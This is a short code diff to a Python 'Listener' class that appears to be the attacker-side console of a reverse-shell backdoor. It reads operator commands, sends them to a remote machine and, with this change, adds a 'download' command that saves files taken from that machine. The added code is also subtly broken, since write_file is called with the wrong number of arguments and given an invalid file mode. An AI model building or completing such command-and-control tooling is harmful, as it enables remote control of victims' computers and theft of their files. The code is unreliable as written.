@@ -71,12 +71,24 @@ class Listener:
         return False
 
 
+    def write_file(self, path, content):
+        with open(path, "+wb") as file:
+            file.write(content)
+            return "[+] Dosya İndirildi"
+        
 
     def run(self):
         while True:
             command = input("-> ")
             # command = command.split(" ")
-            self.remote(command)
+
+            x = self.remote(command)
+
+            if command.startswith("download "):
+                self.write_file(x)
+
+
+            # self.remote(command)
 
 
 my_listener = Listener("127.0.0.1", 4040)
